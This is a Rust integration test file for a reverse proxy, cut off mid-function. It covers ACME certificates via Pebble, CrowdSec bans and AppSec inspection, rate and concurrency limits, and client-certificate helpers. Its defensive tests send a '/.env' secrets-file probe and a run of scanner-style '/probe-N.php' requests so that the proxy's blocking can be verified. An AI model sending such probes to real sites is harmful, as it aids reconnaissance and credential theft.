    assert_eq!(parse(&read_all(&mut held)).status, 200);

    assert_eq!(status_json(admin)["config"]["last_reload"]["ok"], true);
    eprintln!(
        "rotation: {tls_ok} https (new handshake each) and {plain_ok} http requests, 0 failures; \
         {} rejected reload(s)",
        failures.unwrap_or(0.0)
    );
}

fn wait_exit(child: &mut Child, timeout: Duration) -> std::process::ExitStatus {
    let deadline = Instant::now() + timeout;
    loop {
        if let Some(status) = child.try_wait().unwrap() {
            return status;
        }
        assert!(
            Instant::now() < deadline,
            "process {} did not exit",
            child.id()
        );
        thread::sleep(Duration::from_millis(50));
    }
}

/// Pebble, Let's Encrypt's test CA, and its DNS server in Docker on the host network. Every
/// name resolves to 127.0.0.1 and HTTP-01 is validated on port 5002, where conduit listens.
struct Pebble {
    containers: [String; 2],
}

const PEBBLE_TAG: &str = "2.10.1";

fn docker(args: &[&str]) -> String {
    let out = Command::new("docker").args(args).output().unwrap();
    assert!(
        out.status.success(),
        "docker {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

impl Pebble {
    fn start(dir: &Path) -> Pebble {
        let id = std::process::id();
        let dns = format!("conduit-test-challtestsrv-{id}");
        let ca = format!("conduit-test-pebble-{id}");
        let dns_image = format!("ghcr.io/letsencrypt/pebble-challtestsrv:{PEBBLE_TAG}");
        let ca_image = format!("ghcr.io/letsencrypt/pebble:{PEBBLE_TAG}");
        let pebble = Pebble {
            containers: [dns.clone(), ca.clone()],
        };
        docker(&[
            "run",
            "-d",
            "--rm",
            "--name",
            &dns,
            "--network",
            "host",
            &dns_image,
            "-defaultIPv4",
            "127.0.0.1",
            "-defaultIPv6",
            "",
            "-http01",
            "",
            "-https01",
            "",
            "-tlsalpn01",
            "",
            "-dnsserver",
            "127.0.0.1:8053",
            "-management",
            "127.0.0.1:8055",
        ]);
        docker(&[
            "run",
            "-d",
            "--rm",
            "--name",
            &ca,
            "--network",
            "host",
            "-e",
            "PEBBLE_VA_NOSLEEP=1",
            "-e",
            "PEBBLE_WFE_NONCEREJECT=0",
            &ca_image,
            "-dnsserver",
            "127.0.0.1:8053",
        ]);
        let root = dir.join("pebble.pem");
        docker(&[
            "cp",
            &format!("{ca}:/test/certs/pebble.minica.pem"),
            &root.to_string_lossy(),
        ]);
        wait_for_port(14000);
        pebble
    }
}

impl Drop for Pebble {
    fn drop(&mut self) {
        let _ = Command::new("docker")
            .args(["rm", "-f", &self.containers[0], &self.containers[1]])
            .output();
    }
}

/// Issuer common name, serial (hex) and DNS names of the certificate served for `sni`.
fn served(port: u16, sni: &str) -> Result<(String, String, Vec<String>), String> {
    let (s, mut names) = tls_connect(port, sni)?;
    let cert = s.ssl().peer_certificate().ok_or("no certificate")?;
    let issuer = cert
        .issuer_name()
        .entries_by_nid(Nid::COMMONNAME)
        .next()
        .and_then(|e| e.data().to_string().ok())
        .unwrap_or_default();
    let serial = cert.serial_number().to_bn().unwrap().to_hex_str().unwrap();
    names.sort();
    Ok((issuer, serial.to_string(), names))
}

/// Key and certificate for `names` in one PEM, two days from expiry after 85 days.
fn expiring(names: &[&str]) -> Vec<u8> {
    let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1).unwrap();
    let key = PKey::from_ec_key(EcKey::generate(&group).unwrap()).unwrap();
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;
    let mut b = X509Builder::new().unwrap();
    b.set_version(2).unwrap();
    let mut serial = BigNum::new().unwrap();
    serial.rand(64, MsbOption::MAYBE_ZERO, false).unwrap();
    b.set_serial_number(&serial.to_asn1_integer().unwrap())
        .unwrap();
    let mut subject = X509NameBuilder::new().unwrap();
    subject
        .append_entry_by_nid(Nid::COMMONNAME, "expiring")
        .unwrap();
    let subject = subject.build();
    b.set_subject_name(&subject).unwrap();
    b.set_issuer_name(&subject).unwrap();
    b.set_pubkey(&key).unwrap();
    b.set_not_before(&Asn1Time::from_unix(now - 85 * 86_400).unwrap())
        .unwrap();
    b.set_not_after(&Asn1Time::from_unix(now + 2 * 86_400).unwrap())
        .unwrap();
    let mut san = SubjectAlternativeName::new();
    for n in names {
        san.dns(n);
    }
    let ext = san.build(&b.x509v3_context(None, None)).unwrap();
    b.append_extension(ext).unwrap();
    b.sign(&key, MessageDigest::sha256()).unwrap();
    let mut pem = b.build().to_pem().unwrap();
    pem.extend(key.private_key_to_pem_pkcs8().unwrap());
    pem
}

fn mode(path: &Path) -> u32 {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path).unwrap().permissions().mode() & 0o777
}

/// ACME end to end against Pebble: issuance on start, a restart that reuses the stored
/// certificate, renewal of an expiring one under HTTPS load with no failed request, and a
/// refused order that is reported and retried later without touching the other site.
/// Needs Docker: `mise run test-acme`.
#[test]
#[ignore = "needs docker; run with `mise run test-acme`"]
fn acme_with_pebble() {
    let dir = test_dir("acme");
    let _pebble = Pebble::start(&dir);
    let (upstream, _) = echo_upstream();
    let (https_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    let config = |extra: &str| {
        format!(
            r#"
server:
  threads: 1
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:5002"]
  https: ["127.0.0.1:{https_port}"]
admin:
  listen: "127.0.0.1:{admin}"
tls:
  watch_interval: 1s
  acme:
    directory: https://localhost:14000/dir
    ca_file: {d}/pebble.pem
    storage: {d}/acme
    email: ops@acme.test
sites:
  - id: shop
    hosts: [shop.acme.test, www.shop.acme.test]
    upstream: http://127.0.0.1:{upstream}
    acme: true
    force_https: true
{extra}"#,
            d = dir.display()
        )
    };
    std::fs::write(&cfg_path, config("")).unwrap();
    let mut proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(https_port);
    let names = vec![
        "shop.acme.test".to_string(),
        "www.shop.acme.test".to_string(),
    ];
    let orders = |result: &str| {
        let m = http(admin, "localhost", "/metrics", &[]).body;
        metric(
            &m,
            "conduit_acme_orders_total",
            &[&format!("result=\"{result}\"")],
        )
        .unwrap_or(-1.0)
    };

    // 1. Issued on start; until then the handshake for these names fails.
    let started = Instant::now();
    let mut first = None;
    wait_until(
        "the first ACME certificate",
        Duration::from_secs(90),
        || {
            first = served(https_port, "shop.acme.test")
                .ok()
                .filter(|(issuer, _, _)| issuer.starts_with("Pebble"));
            first.is_some()
        },
    );
    let (issuer, serial1, got) = first.unwrap();
    eprintln!(
        "acme: issued by {issuer:?} in {:.1}s",
        started.elapsed().as_secs_f64()
    );
    assert_eq!(got, names);
    let (r, _) = https(https_port, "www.shop.acme.test", "/").unwrap();
    assert_eq!(r.status, 200, "{r:?}");
    let r = http(5002, "shop.acme.test", "/page", &[]);
    assert_eq!(r.status, 301, "{r:?}");
    assert_eq!(orders("success"), 1.0);
    let status = status_json(admin);
    let site = &status["acme"]["sites"][0];
    assert_eq!(site["id"], "shop", "{status}");
    assert_eq!(site["renew_window_from_ca"], true, "{site}");
    assert!(
        site["renew_at"].is_string() && site["last_error"].is_null(),
        "{site}"
    );
    let file = PathBuf::from(site["file"].as_str().unwrap());
    assert_eq!(mode(&file), 0o600);
    assert_eq!(mode(&file.with_file_name("account.json")), 0o600);
    assert_eq!(mode(&dir.join("acme")), 0o700);

    // 2. A restart serves the stored certificate at once and orders nothing.
    signal(proxy.child.id(), "-TERM");
    wait_exit(&mut proxy.child, Duration::from_secs(10));
    proxy.child = spawn(&cfg_path, &[], "conduit2.log");
    wait_for_port(https_port);
    let (_, serial, _) = served(https_port, "shop.acme.test").unwrap();
    assert_eq!(serial, serial1);
    thread::sleep(Duration::from_secs(2));
    assert_eq!(orders("success"), 0.0);

    // 3. An expiring certificate is renewed while HTTPS traffic keeps flowing.
    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let load = {
        let stop = stop.clone();
        thread::spawn(move || {
            let (mut ok, mut failed, mut serials) = (0, Vec::new(), BTreeSet::new());
            while !stop.load(Ordering::SeqCst) {
                match served(https_port, "shop.acme.test") {
                    Ok((_, serial, _)) => match https(https_port, "shop.acme.test", "/") {
                        Ok((r, _)) if r.status == 200 => {
                            ok += 1;
                            serials.insert(serial);
                        }
                        Ok((r, _)) => failed.push(format!("status {}", r.status)),
                        Err(e) => failed.push(e),
                    },
                    Err(e) => failed.push(e),
                }
            }
            (ok, failed, serials)
        })
    };
    thread::sleep(Duration::from_millis(500));
    let tmp = file.with_extension("test");
    std::fs::write(&tmp, expiring(&["shop.acme.test", "www.shop.acme.test"])).unwrap();
    std::fs::rename(&tmp, &file).unwrap();
    let mut renewed = String::new();
    wait_until(
        "the renewed certificate",
        Duration::from_secs(90),
        || match served(https_port, "shop.acme.test") {
            Ok((issuer, serial, _)) if issuer.starts_with("Pebble") && serial != serial1 => {
                renewed = serial;
                true
            }
            _ => false,
        },
    );
    thread::sleep(Duration::from_millis(500));
    stop.store(true, Ordering::SeqCst);
    let (ok, failed, serials) = load.join().unwrap();
    assert!(failed.is_empty(), "failed during renewal: {failed:?}");
    assert!(serials.contains(&renewed), "{serials:?}");
    assert_eq!(orders("success"), 1.0);
    eprintln!(
        "acme: renewed under load, {ok} HTTPS requests, 0 failures, {} certificates seen",
        serials.len()
    );

    // 4. A name the CA refuses: reported, retried later, the other site keeps its certificate.
    std::fs::write(
        &cfg_path,
        config(&format!(
            "  - {{ id: blocked, hosts: [blocked-domain.example], upstream: \"http://127.0.0.1:{upstream}\", acme: true }}\n"
        )),
    )
    .unwrap();
    let mut blocked = serde_json::Value::Null;
    wait_until("the refused order", Duration::from_secs(30), || {
        let s = status_json(admin);
        blocked = s["acme"]["sites"]
            .as_array()
            .and_then(|a| a.iter().find(|x| x["id"] == "blocked").cloned())
            .unwrap_or_default();
        blocked["last_error"].is_string()
    });
    eprintln!("acme: refused order reported as {}", blocked["last_error"]);
    assert!(blocked["retry_at"].is_string(), "{blocked}");
    assert_eq!(orders("failure"), 1.0);
    let (_, serial, _) = served(https_port, "shop.acme.test").unwrap();
    assert_eq!(serial, renewed);
}

/// A local CrowdSec (LAPI and AppSec) in Docker, reading conduit's access log with the parser
/// from `deploy/crowdsec`. AppSec runs the default rules plus a test rule that refuses
/// bodies containing `conduit-evil-marker`.
struct CrowdSec {
    name: String,
    lapi: u16,
    appsec: u16,
}

const CROWDSEC_TAG: &str = "v1.8.2";
const BOUNCER_KEY: &str = "conduit-e2e-bouncer-key-0123456789";

/// Like `http`, but sends `raw` as it is and returns `None` when nothing answers.
fn exchange(port: u16, raw: &[u8]) -> Option<Resp> {
    let mut s = TcpStream::connect(("127.0.0.1", port)).ok()?;
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(raw).ok()?;
    let r = parse(&read_all(&mut s));
    (r.status != 0).then_some(r)
}

impl CrowdSec {
    fn start(dir: &Path) -> CrowdSec {
        let cs = CrowdSec {
            name: format!("conduit-test-crowdsec-{}", std::process::id()),
            lapi: free_port(),
            appsec: free_port(),
        };
        let etc = dir.join("crowdsec");
        std::fs::create_dir_all(&etc).unwrap();
        std::fs::create_dir_all(dir.join("log")).unwrap();
        // The file source tails files that exist when it starts.
        std::fs::write(dir.join("log/access.log"), b"").unwrap();
        let files = [
            (
                "acquis-conduit.yaml",
                "filenames:\n  - /var/log/conduit/access.log\nlabels:\n  type: conduit\n",
            ),
            (
                "acquis-appsec.yaml",
                "appsec_configs:\n  - crowdsecurity/appsec-default\n  - conduit-test/body-marker\n\
                 labels:\n  type: appsec\nlisten_addr: 0.0.0.0:7422\nsource: appsec\n",
            ),
            (
                "rule.yaml",
                "name: conduit-test/body-marker\ndescription: test marker in the body\nrules:\n\
                 \x20 - zones: [RAW_BODY]\n    transform: [lowercase]\n    match: { type: contains, value: conduit-evil-marker }\n\
                 labels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: marker\n",
            ),
            (
                "rule-config.yaml",
                "name: conduit-test/body-marker\ndefault_remediation: ban\ninband_rules:\n  - conduit-test/body-marker\n",
            ),
        ];
        for (name, text) in files {
            std::fs::write(etc.join(name), text).unwrap();
        }
        let parser =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("deploy/crowdsec/conduit-logs.yaml");
        let mount = |src: &Path, dst: &str| format!("{}:{dst}:ro", src.display());
        docker(&[
            "run",
            "-d",
            "--name",
            &cs.name,
            "-e",
            "DISABLE_ONLINE_API=true",
            "-e",
            &format!("BOUNCER_KEY_conduit={BOUNCER_KEY}"),
            "-e",
            "COLLECTIONS=crowdsecurity/base-http-scenarios crowdsecurity/appsec-virtual-patching crowdsecurity/appsec-generic-rules",
            // An anonymous volume, removed with the container: CrowdSec insists on one.
            "-v",
            "/var/lib/crowdsec/data",
            "-v",
            &format!("{}:/var/log/conduit", dir.join("log").display()),
            "-v",
            &mount(
                &etc.join("acquis-conduit.yaml"),
                "/etc/crowdsec/acquis.d/conduit.yaml",
            ),
            "-v",
            &mount(
                &etc.join("acquis-appsec.yaml"),
                "/etc/crowdsec/acquis.d/appsec.yaml",
            ),
            "-v",
            &mount(
                &etc.join("rule.yaml"),
                "/etc/crowdsec/appsec-rules/body-marker.yaml",
            ),
            "-v",
            &mount(
                &etc.join("rule-config.yaml"),
                "/etc/crowdsec/appsec-configs/body-marker.yaml",
            ),
            "-v",
            &mount(&parser, "/etc/crowdsec/parsers/s01-parse/conduit-logs.yaml"),
            "-p",
            &format!("127.0.0.1:{}:8080", cs.lapi),
            "-p",
            &format!("127.0.0.1:{}:7422", cs.appsec),
            &format!("crowdsecurity/crowdsec:{CROWDSEC_TAG}"),
        ]);
        let lapi = format!(
            "GET /v1/decisions/stream?startup=true HTTP/1.1\r\nHost: lapi\r\nX-Api-Key: {BOUNCER_KEY}\r\nConnection: close\r\n\r\n"
        );
        wait_until("the CrowdSec local API", Duration::from_secs(120), || {
            exchange(cs.lapi, lapi.as_bytes()).is_some_and(|r| r.status == 200)
        });
        let appsec = format!(
            "GET / HTTP/1.1\r\nHost: appsec\r\nX-Crowdsec-Appsec-Ip: 192.0.2.1\r\nX-Crowdsec-Appsec-Uri: /\r\n\
             X-Crowdsec-Appsec-Host: a\r\nX-Crowdsec-Appsec-Verb: GET\r\nX-Crowdsec-Appsec-Api-Key: {BOUNCER_KEY}\r\n\
             User-Agent: probe\r\nX-Crowdsec-Appsec-User-Agent: probe\r\nConnection: close\r\n\r\n"
        );
        wait_until("CrowdSec AppSec", Duration::from_secs(60), || {
            exchange(cs.appsec, appsec.as_bytes()).is_some_and(|r| r.status == 200)
        });
        cs
    }

    fn cscli(&self, args: &[&str]) -> String {
        let mut all = vec!["exec", self.name.as_str(), "cscli"];
        all.extend_from_slice(args);
        docker(&all)
    }
}

impl Drop for CrowdSec {
    fn drop(&mut self) {
        if thread::panicking() {
            let logs = Command::new("docker")
                .args(["logs", "--tail", "40", &self.name])
                .output();
            if let Ok(o) = logs {
                eprintln!(
                    "crowdsec logs:\n{}{}",
                    String::from_utf8_lossy(&o.stdout),
                    String::from_utf8_lossy(&o.stderr)
                );
            }
        }
        let _ = Command::new("docker")
            .args(["rm", "-f", "-v", &self.name])
            .output();
    }
}

#[test]
#[ignore = "needs docker; run with `mise run test-crowdsec`"]
fn crowdsec_bouncer_and_appsec() {
    let dir = test_dir("crowdsec");
    let cs = CrowdSec::start(&dir);
    let (upstream, _) = echo_upstream();
    let (http_port, https_port, admin) = (free_port(), free_port(), free_port());
    let (cert, key) = self_signed(&dir, "app", &["app.cs.test"]);
    std::fs::write(dir.join("bouncer.key"), format!("{BOUNCER_KEY}\n")).unwrap();
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
  https: ["127.0.0.1:{https_port}"]
admin:
  listen: "127.0.0.1:{admin}"
tls:
  certs:
    - {{ name: app, cert: {cert}, key: {key} }}
access_log:
  path: {d}/log/access.log
real_ip:
  header: X-Real-IP
  trusted: [127.0.0.1/32]
crowdsec:
  lapi_url: http://127.0.0.1:{lapi}
  api_key_file: {d}/bouncer.key
  update_interval: 1s
  appsec:
    url: http://127.0.0.1:{appsec}
    timeout: 1s
sites:
  - id: app
    hosts: [app.cs.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - crowdsec: {{ appsec: true }}
  - id: plain
    hosts: [plain.cs.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - crowdsec:
"#,
            d = dir.display(),
            lapi = cs.lapi,
            appsec = cs.appsec,
            cert = cert.display(),
            key = key.display(),
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    wait_until("the first decision pull", Duration::from_secs(20), || {
        !status_json(admin)["crowdsec"]["last_pull"].is_null()
    });

    let get = |host: &str, path: &str, ip: &str| {
        http(
            http_port,
            host,
            path,
            &[("X-Real-IP", ip), ("User-Agent", "e2e/1")],
        )
    };
    let post = |path: &str, ip: &str, body: &str| {
        exchange(
            http_port,
            format!(
                "POST {path} HTTP/1.1\r\nHost: app.cs.test\r\nX-Real-IP: {ip}\r\nUser-Agent: e2e/1\r\n\
                 Content-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            )
            .as_bytes(),
        )
        .unwrap()
    };
    let metrics = || http(admin, "localhost", "/metrics", &[]).body;
    assert_eq!(get("app.cs.test", "/", "198.51.100.10").status, 200);

    // 1. A decision on an address: refused on every crowdsec site within a pull or two.
    let t = Instant::now();
    cs.cscli(&[
        "decisions",
        "add",
        "--ip",
        "198.51.100.10",
        "--duration",
        "1h",
        "--reason",
        "e2e",
    ]);
    wait_until("the ban on 198.51.100.10", Duration::from_secs(10), || {
        get("app.cs.test", "/", "198.51.100.10").status == 403
    });
    eprintln!(
        "crowdsec: ban applied {:.1}s after cscli",
        t.elapsed().as_secs_f64()
    );
    let r = get("plain.cs.test", "/", "198.51.100.10");
    assert_eq!(r.status, 403);
    assert!(r.body.contains("blocked"), "{r:?}");
    assert_eq!(r.header("cache-control"), Some("no-store"));
    assert_eq!(get("app.cs.test", "/", "198.51.100.11").status, 200);

    // 2. A range, of a captcha decision (refused too: no captcha support).
    cs.cscli(&[
        "decisions",
        "add",
        "--range",
        "198.51.100.128/25",
        "--duration",
        "1h",
        "--type",
        "captcha",
    ]);
    wait_until("the range decision", Duration::from_secs(10), || {
        get("plain.cs.test", "/", "198.51.100.200").status == 403
    });
    assert_eq!(get("plain.cs.test", "/", "198.51.100.127").status, 200);

    // 3. Deleting the decision lifts it.
    cs.cscli(&["decisions", "delete", "--ip", "198.51.100.10"]);
    wait_until("the lifted ban", Duration::from_secs(10), || {
        get("app.cs.test", "/", "198.51.100.10").status == 200
    });
    assert_eq!(status_json(admin)["crowdsec"]["decisions"], 1);

    // 4. AppSec, only on the site that asks for it.
    assert_eq!(get("app.cs.test", "/.env", "198.51.100.20").status, 403);
    assert_eq!(get("plain.cs.test", "/.env", "198.51.100.20").status, 200);
    let r = post("/login", "198.51.100.20", "user=a&note=CONDUIT-EVIL-MARKER");
    assert_eq!(r.status, 403, "{r:?}");
    // A clean body is inspected, then reaches the upstream whole.
    let r = post("/login", "198.51.100.20", "user=a&note=fine");
    assert_eq!(r.status, 200, "{r:?}");
    assert!(r.body.ends_with("user=a&note=fine"), "{r:?}");
    // The same over HTTP/2, where Pingora replays the body from its own H2 buffer.
    let h2 = |body: &str| {
        let out = Command::new("curl")
            .args([
                "-sk",
                "--http2",
                "-o",
                "-",
                "-w",
                "\n%{http_code} %{http_version}",
            ])
            .args(["--resolve", &format!("app.cs.test:{https_port}:127.0.0.1")])
            .args(["-H", "X-Real-IP: 198.51.100.22", "-H", "User-Agent: e2e/1"])
            .args(["-H", "Content-Type: text/plain", "--data-binary", body])
            .arg(format!("https://app.cs.test:{https_port}/login"))
            .output()
            .expect("curl");
        String::from_utf8_lossy(&out.stdout).into_owned()
    };
    let out = h2("user=b&note=fine-over-h2");
    assert!(out.ends_with("user=b&note=fine-over-h2\n200 2"), "{out}");
    let out = h2("user=b&note=conduit-evil-marker");
    assert!(out.ends_with("\n403 2"), "{out}");
    let m = metrics();
    assert!(metric(&m, "conduit_crowdsec_blocked_total", &["by=\"appsec\""]).unwrap() >= 2.0);
    assert!(metric(&m, "conduit_crowdsec_blocked_total", &["by=\"crowdsec\""]).unwrap() >= 3.0);
    assert!(
        metric(
            &m,
            "conduit_crowdsec_appsec_requests_total",
            &["result=\"allow\""]
        )
        .unwrap()
            >= 1.0
    );

    // 5. CrowdSec paused: AppSec fails open after its timeout, and the decisions held keep
    // applying while the local API is unreachable.
    docker(&["pause", &cs.name]);
    let t = Instant::now();
    assert_eq!(get("app.cs.test", "/.env", "198.51.100.21").status, 200);
    let waited = t.elapsed();
    assert!(
        waited >= Duration::from_millis(900) && waited < Duration::from_secs(5),
        "{waited:?}"
    );
    wait_until("a failed pull", Duration::from_secs(30), || {
        !status_json(admin)["crowdsec"]["last_error"].is_null()
    });
    assert_eq!(get("plain.cs.test", "/", "198.51.100.200").status, 403);
    docker(&["unpause", &cs.name]);
    wait_until("pulls to recover", Duration::from_secs(30), || {
        status_json(admin)["crowdsec"]["last_error"].is_null()
    });
    assert_eq!(get("plain.cs.test", "/", "198.51.100.200").status, 403);
    assert!(
        metric(
            &metrics(),
            "conduit_crowdsec_appsec_requests_total",
            &["result=\"error\""]
        )
        .unwrap()
            >= 1.0
    );

    // 6. The whole loop: probing 404s in conduit's access log, read by CrowdSec through the
    // parser in deploy/crowdsec, become a ban that conduit enforces.
    let prober = "203.0.113.77";
    for i in 0..20 {
        let r = get("unknown.cs.test", &format!("/probe-{i}.php"), prober);
        assert_eq!(r.status, 404);
    }
    let t = Instant::now();
    wait_until(
        "CrowdSec to ban the prober",
        Duration::from_secs(60),
        || get("app.cs.test", "/", prober).status == 403,
    );
    eprintln!(
        "crowdsec: prober banned {:.1}s after its last probe",
        t.elapsed().as_secs_f64()
    );
    let alerts = cs.cscli(&["alerts", "list", "-o", "json"]);
    assert!(alerts.contains("crowdsecurity/http-probing"), "{alerts}");

    let log = std::fs::read_to_string(dir.join("log/access.log")).unwrap();
    assert!(log.contains("\"blocked_by\":\"appsec\""));
    assert!(log.contains("\"blocked_by\":\"crowdsec\""));
}

/// An upstream that answers every request after `delay`, to keep requests in flight.
fn slow_upstream(delay: Duration) -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            thread::spawn(move || {
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut stream = stream;
                loop {
                    let mut line = String::new();
                    loop {
                        line.clear();
                        if reader.read_line(&mut line).unwrap_or(0) == 0 {
                            return;
                        }
                        if line == "\r\n" {
                            break;
                        }
                    }
                    thread::sleep(delay);
                    if stream
                        .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nslow\n")
                        .is_err()
                    {
                        return;
                    }
                }
            });
        }
    });
    port
}

#[test]
fn rate_and_concurrency_limits() {
    let dir = test_dir("limits");
    let (upstream, _) = echo_upstream();
    let slow = slow_upstream(Duration::from_millis(800));
    let (http_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    let config = |extra: &str| {
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
real_ip:
  header: X-Real-IP
  trusted: [127.0.0.1/32]
tls:
  watch_interval: 1s
sites:
  - id: api
    hosts: [api.limits.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - rate_limit: {{ requests: 5, per: 1m, match: {{ path: {{ prefix: /login }} }} }}
  - id: slow
    hosts: [slow.limits.test]
    upstream: http://127.0.0.1:{slow}
    plugins:
      - concurrency: {{ max: 2 }}
{extra}"#,
            d = dir.display()
        )
    };
    std::fs::write(&cfg_path, config("")).unwrap();
    let proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let get = |host: &str, path: &str, ip: &str| http(http_port, host, path, &[("X-Real-IP", ip)]);

    // rate_limit: 5 a minute on /login per client; other paths and clients are not affected.
    for _ in 0..5 {
        assert_eq!(get("api.limits.test", "/login", "198.51.100.1").status, 200);
    }
    let r = get("api.limits.test", "/login", "198.51.100.1");
    assert_eq!(r.status, 429, "{r:?}");
    assert_eq!(r.header("retry-after"), Some("60"));
    assert_eq!(get("api.limits.test", "/other", "198.51.100.1").status, 200);
    assert_eq!(get("api.limits.test", "/login", "198.51.100.2").status, 200);

    // A reload (here: a new site) keeps the counts.
    std::fs::write(
        &cfg_path,
        config("  - { id: extra, hosts: [extra.limits.test], upstream: \"http://127.0.0.1:1\" }\n"),
    )
    .unwrap();
    signal(proxy.child.id(), "-HUP");
    wait_until("the reload", Duration::from_secs(10), || {
        status_json(admin)["host_names"] == 3
    });
    assert_eq!(get("api.limits.test", "/login", "198.51.100.1").status, 429);

    // concurrency: the third request of one client while two are in flight is refused at
    // once; another client is not affected; once they finish, there is room again.
    let started = Instant::now();
    let inflight: Vec<_> = (0..2)
        .map(|_| {
            thread::spawn(move || {
                http(
                    http_port,
                    "slow.limits.test",
                    "/",
                    &[("X-Real-IP", "198.51.100.7")],
                )
                .status
            })
        })
        .collect();
    thread::sleep(Duration::from_millis(250));
    let r = get("slow.limits.test", "/", "198.51.100.7");
    assert_eq!(r.status, 429, "{r:?}");
    assert!(
        started.elapsed() < Duration::from_millis(700),
        "refused only after {:?}",
        started.elapsed()
    );
    let other = thread::spawn(move || {
        http(
            http_port,
            "slow.limits.test",
            "/",
            &[("X-Real-IP", "198.51.100.8")],
        )
        .status
    });
    for t in inflight {
        assert_eq!(t.join().unwrap(), 200);
    }
    assert_eq!(other.join().unwrap(), 200);
    assert_eq!(get("slow.limits.test", "/", "198.51.100.7").status, 200);

    let m = http(admin, "localhost", "/metrics", &[]).body;
    assert_eq!(
        metric(
            &m,
            "conduit_limit_refused_total",
            &["site=\"api\"", "limit=\"rate_limit\""]
        ),
        Some(2.0)
    );
    assert_eq!(
        metric(
            &m,
            "conduit_limit_refused_total",
            &["site=\"slow\"", "limit=\"concurrency\""]
        ),
        Some(1.0)
    );
    wait_until("the access log", Duration::from_secs(5), || {
        let log = std::fs::read_to_string(dir.join("access.log")).unwrap_or_default();
        log.contains("\"blocked_by\":\"rate_limit\"")
            && log.contains("\"blocked_by\":\"concurrency\"")
    });
}

/// A CA for client certificates.
struct Ca {
    cert: X509,
    key: PKey<Private>,
}

fn ec_key() -> PKey<Private> {
    let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1).unwrap();
    PKey::from_ec_key(EcKey::generate(&group).unwrap()).unwrap()
}

fn cert_builder(cn: &str, org: &str, key: &PKey<Private>, valid: (i64, i64)) -> X509Builder {
    let mut name = X509NameBuilder::new().unwrap();
    name.append_entry_by_nid(Nid::ORGANIZATIONNAME, org)
        .unwrap();
    name.append_entry_by_nid(Nid::COMMONNAME, cn).unwrap();
    let name = name.build();
    let mut b = X509Builder::new().unwrap();
    b.set_version(2).unwrap();
    let mut serial = BigNum::new().unwrap();
    serial.rand(64, MsbOption::MAYBE_ZERO, false).unwrap();
    b.set_serial_number(&serial.to_asn1_integer().unwrap())
        .unwrap();
    b.set_subject_name(&name).unwrap();
    b.set_pubkey(key).unwrap();
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;
    b.set_not_before(&Asn1Time::from_unix(now + valid.0 * 86_400).unwrap())
        .unwrap();
    b.set_not_after(&Asn1Time::from_unix(now + valid.1 * 86_400).unwrap())
        .unwrap();
    b
}

impl Ca {
    fn new(cn: &str) -> Ca {
        let key = ec_key();
        let mut b = cert_builder(cn, "Conduit Test", &key, (-1, 30));
        let subject = {
            let mut n = X509NameBuilder::new().unwrap();
            n.append_entry_by_nid(Nid::ORGANIZATIONNAME, "Conduit Test")
                .unwrap();
            n.append_entry_by_nid(Nid::COMMONNAME, cn).unwrap();
            n.build()
        };
        b.set_issuer_name(&subject).unwrap();
        b.append_extension(BasicConstraints::new().critical().ca().build().unwrap())
            .unwrap();
        b.append_extension(
            KeyUsage::new()
                .critical()
                .key_cert_sign()
                .crl_sign()
                .build()
                .unwrap(),
        )
        .unwrap();
        b.sign(&key, MessageDigest::sha256()).unwrap();
        Ca {
            cert: b.build(),
            key,
        }
    }

    /// A client certificate valid from `valid.0` to `valid.1` days from now.
    fn issue(&self, cn: &str, valid: (i64, i64)) -> (X509, PKey<Private>) {
        let key = ec_key();
        let mut b = cert_builder(cn, "Conduit Test", &key, valid);
        b.set_issuer_name(self.cert.subject_name()).unwrap();
        b.append_extension(ExtendedKeyUsage::new().client_auth().build().unwrap())
            .unwrap();
        b.sign(&self.key, MessageDigest::sha256()).unwrap();
        (b.build(), key)
    }
}

struct MtlsReply {
    resp: Resp,
    reused: bool,
    session: SslSession,
}

/// One request over a new TLS connection with SNI `sni`, optionally presenting a client
/// certificate and offering a session to resume.
fn mtls_get(
    port: u16,
    sni: &str,
    host: &str,
    version: SslVersion,
    cert: Option<&(X509, PKey<Private>)>,
    session: Option<&SslSession>,
    extra: &[(&str, &str)],
) -> MtlsReply {
